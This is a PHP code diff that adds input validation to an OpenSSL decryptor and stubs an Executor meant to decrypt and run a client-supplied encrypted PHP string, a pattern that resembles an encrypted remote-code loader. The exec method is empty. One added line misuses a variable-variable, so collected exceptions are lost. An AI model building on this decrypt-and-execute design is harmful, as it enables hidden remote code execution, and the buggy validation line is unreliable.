@@ -130,7 +130,7 @@ trait ClientDataValidator
      * @throws MissingRequirementException
      * @throws TypeError
      */
-    final private function validateSingle(
+    private function validateSingle(
         string $obj,
         ClassObjTyping $classObjTyping,
         array $clientArgs
@@ -156,10 +156,15 @@ trait ClientDataValidator
         $classObjs = $this->getClassObjs();
         $exceptionsArray = [];
         foreach ($classObjs as $obj => $classObjTyping) {
-            $this->validateSingle($obj, $classObjTyping, $clientArgs);
+            try {
+                $this->validateSingle($obj, $classObjTyping, $clientArgs);
+            } catch (Exception $e) {
+                ${$exceptionsArray}[] = $e;
+            }
         }
-        if ($exceptionsArray)
+        if ($exceptionsArray !== []) {
             throw new MultipleExceptions($exceptionsArray);
+        }
     }
 }
 
@@ -185,26 +190,42 @@ enum ClassObjOptional: string
 
 class ClassObjTyping
 {
-    public Typing $type;
-    public ClassObjOptional $optional;
+    public function __construct(public Typing $type, public ClassObjOptional $optional)
+    {
+    }
 }
 
 class OpensslDecryptor implements Decryptor
 {
     use Singleton;
+    use ClientDataValidator;
     private readonly string $cipher_algo;
     private readonly string $passphrase;
     private readonly ?string $tag;
     private int $options = 0;
     private string $iv = "";
     private string $aad = "";
+    private function getClassObjs(): array
+    {
+        return [
+            "cipher_algo" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
+            "passphrase" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
+            "tag" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
+            "options" => new ClassObjTyping(Typing::INTEGER, ClassObjOptional::OPTIONAL),
+            "iv" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
+            "aad" =>  new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
+        ];
+    }
     private function __construct(array $args)
     {
+        $this->validate($args);
         $this->cipher_algo = $args["cipher_algo"];
         $this->passphrase = $args["passphrase"];
         $optArgs = ["tag", "options", "iv", "aad"];
         foreach ($optArgs as $optArg) {
-            $this->$optArg = $args[$optArg];
+            if (isset($args[$optArg])) {
+                $this->$optArg = $args[$optArg];
+            }
         }
     }
     final public function decrypt(string $data): string|false
@@ -354,10 +375,14 @@ class Executor
             associative: true,
             flags: JSON_THROW_ON_ERROR
         );
+        // $this->clientData = [
+        //     "cipher_algo" => "aes-256-gcm",
+        //     "passphrase" => "lol",
+        // ];
         $decryptorPtr = GetPHP::getInstance()->getDecryptor();
         $this->decryptor = $decryptorPtr::getInstance($this->clientData);
     }
-    private function exec($encryptedPhpString)
+    private function exec(string $encryptedPhpString)
     {
     }
 }
